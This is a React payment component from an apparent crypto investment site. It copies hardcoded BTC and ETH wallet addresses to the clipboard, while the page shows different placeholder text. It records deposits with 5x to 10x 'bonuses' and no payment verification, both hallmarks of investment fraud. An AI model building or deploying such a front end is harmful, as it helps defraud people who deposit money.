import React, { useState, useEffect } from 'react';
import { db } from "../../database/firebaseConfig";
import { doc, addDoc, collection } from "firebase/firestore";

const PaymentSect = ({setProfileState, investData, bitPrice, ethPrice}) => {
    const [copystate, setCopystate] = useState("Copy");

    const colRef = collection(db, "investments");

    // Debug logging for prices
    useEffect(() => {
        console.log('PaymentSect Prices:', { 
            bitPrice, 
            ethPrice, 
            bitPriceType: typeof bitPrice, 
            ethPriceType: typeof ethPrice,
            investAmount: investData?.capital 
        });
    }, [bitPrice, ethPrice, investData?.capital]);

    // Helper function to calculate crypto amount
    const calculateCryptoAmount = (amount, price, crypto) => {
        if (!price || price <= 0 || !amount || amount <= 0) {
            console.warn(`Invalid ${crypto} calculation:`, { amount, price });
            return '0.000';
        }
        const result = (amount / price).toFixed(8);
        console.log(`${crypto} calculation:`, { amount, price, result });
        return parseFloat(result).toFixed(3); // Show 3 decimals for investment
    };

    const removeErr = () => {
        setTimeout(() => {
            setCopystate("Copy");
        }, 2500);
    }

    const copyToClipboard = (text) => {
        navigator.clipboard.writeText(text)
          .then(() => {
            setCopystate("Copied");
            removeErr()
          })
          .catch((err) => {
            console.error('Unable to copy text to clipboard', err);
          });
    }

    const handleTransacConfirmation = () => {
        addDoc(colRef, {...investData, bonus: investData?.plan === "Silver" ? investData?.capital*5 : investData?.plan === "Gold" ? investData?.capital*8 : investData?.capital*10});
        setProfileState("Investments");
    }
  return (
    <div className="paymentSect">
        <h2>Confirm Payment</h2>
        <div className="mainPaymentSect">
            <h3>Send exactly <span>{investData?.paymentOption === "Bitcoin" ? `${calculateCryptoAmount(investData?.capital, bitPrice, 'BTC')} BTC` : `${calculateCryptoAmount(investData?.capital, ethPrice, 'ETH')} ETH`}</span> to</h3>
            <p>{investData?.paymentOption === "Bitcoin" ? "addresshere" : "heretoo"} <span onClick={() => {copyToClipboard(`${investData?.paymentOption === "Bitcoin" ? "bc1q4d5rfgeuq0su78agvermq3fpqtxjczlzhnttty" : "0x1D2C71bF833Df554A86Ad142f861bc12f3B24c1c"}`)}}>{copystate} <i className="icofont-ui-copy"></i></span></p>
        </div>
        <p>Confirm the transaction after the specified amount has been transferred while we complete the transaction process.</p>
        <p>The completion of the transaction process might take between couple minutes to several hours. You can check for the status of your investment in the Investment section of your User-Account-Display-Interface.</p>
        <button type="button" onClick={handleTransacConfirmation}>Confirm Transaction</button>
    </div>
  )
}

export default PaymentSect



// 0x1D2C71bF833Df554A86Ad142f861bc12f3B24c1c